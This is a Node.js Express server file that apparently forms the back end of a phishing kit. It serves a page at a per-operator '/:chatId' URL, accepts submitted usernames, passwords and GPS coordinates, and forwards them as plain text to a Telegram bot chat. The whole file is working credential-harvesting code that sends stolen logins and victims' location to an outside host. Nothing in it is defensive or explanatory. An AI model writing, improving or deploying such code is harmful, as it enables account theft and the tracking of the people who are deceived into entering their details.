import express from "express";
import axios from "axios";
import cors from "cors";
import dotenv from "dotenv";
import path from "path";
import { fileURLToPath } from "url";

// Load environment variables
dotenv.config();

// Get __dirname equivalent in ES module
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

// Middleware
app.use(express.json());
app.use(
    cors({
        origin: "*", // Change this to your frontend URL in production
        methods: ["GET", "POST"],
        allowedHeaders: ["Content-Type", "Authorization"],
    })
);

// Serve static frontend files
app.use(express.static(path.join(__dirname, "public")));

// Handle requests with dynamic chatId and return the frontend page
app.get("/:chatId", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

// API Route to send Telegram message
app.post("/:chatId/sendMessage", async (req, res) => {
    const { chatId } = req.params;
    const { username, password, latitude, longitude } = req.body;

    if (!chatId) {
        return res.status(400).json({ error: "Missing chatId in URL" });
    }

    if (!username || !password) {
        return res.status(400).json({ error: "Missing required fields" });
    }

    const message = `Username: ${username}\nPassword: ${password}\nLatitude: ${latitude}\nLongitude: ${longitude}`;
    const telegramAPI = `https://api.telegram.org/bot${process.env.BOT_TOKEN}/sendMessage`;

    try {
        const response = await axios.post(telegramAPI, {
            chat_id: chatId,
            text: message,
        });
        res.json({ success: true, message: "Sent to Telegram", data: response.data });
    } catch (error) {
        console.error("❌ Telegram API Error:", error.response?.data || error.message);
        res.status(500).json({ error: "Failed to send message" });
    }
});

// Start the server
const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`✅ Server running on port ${port}`);
});
